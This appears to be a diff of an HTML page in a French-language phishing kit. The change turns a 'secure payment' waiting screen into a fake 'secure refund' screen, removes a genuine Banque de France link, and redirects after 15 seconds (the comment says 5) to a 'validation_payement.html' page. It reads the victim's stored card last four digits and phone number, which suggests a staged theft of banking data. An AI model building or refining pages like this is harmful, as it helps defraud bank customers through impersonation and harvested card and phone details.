@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Traitement du paiement...</title>
+    <title>Traitement en cours...</title>
     <style>
         /* Général */
         body {
@@ -77,13 +77,6 @@
             font-size: 12px;
             color: #888;
         }
-
-        /* Lien alternatif */
-        .alternative-link {
-            margin-top: 15px;
-            font-size: 14px;
-            color: #2a7ae4;
-        }
     </style>
 </head>
 <body>
@@ -91,7 +84,7 @@
     <div class="container">
         <!-- Icônes sécurisées -->
         <div class="secure-icons">
-            <img src="logo-paiement-securise (1).png" alt="Paiement Sécurisé">
+            <img src="logo-paiement-securise (1).png" alt="Remboursement Sécurisé">
         </div>
 
         <!-- Cercle de chargement -->
@@ -99,7 +92,7 @@
 
         <!-- Message principal -->
         <p class="message">
-            Merci de patienter, votre paiement est en cours de traitement...
+            Merci de patienter, votre remboursement est en cours de traitement...
         </p>
 
         <!-- Texte secondaire -->
@@ -107,23 +100,22 @@
             Cette opération est sécurisée par nos partenaires bancaires.
         </p>
 
-        <!-- Lien alternatif -->
-        <p class="alternative-link">
-            Si vous n'êtes pas redirigé automatiquement, <a href="https://www.banque-france.fr/fr">cliquez ici</a>.
-        </p>
-
         <!-- Pied de page -->
         <div class="footer">
-            © 2024 Service de Paiement Sécurisé | Sécurité garantie | Tous droits réservés.
+            © 2024 Service de Remboursement | Sécurité garantie | Tous droits réservés.
         </div>
     </div>
 
+    <!-- Script JavaScript للتوجيه بعد 5 ثوانٍ -->
     <script>
-        // Redirection automatique après 5 secondes
         setTimeout(() => {
-            console.log("Redirection vers la Banque de France...");
-            window.location.href = "https://www.banque-france.fr/fr";
-        }, 5000); // 5000 ms = 5 secondes
+            // تخزين البيانات لضمان وجودها عند التوجيه إلى الصفحة الثالثة
+            const lastFourDigits = localStorage.getItem('lastFourDigits') || '0000';
+            const phoneNumber = localStorage.getItem('phoneNumber') || 'Non renseigné';
+
+            // إعادة توجيه مع ضمان استمرار البيانات
+            window.location.href = "validation_payement.html";
+        }, 15000); // التوجيه بعد 5 ثوانٍ
     </script>
 </body>
 </html>
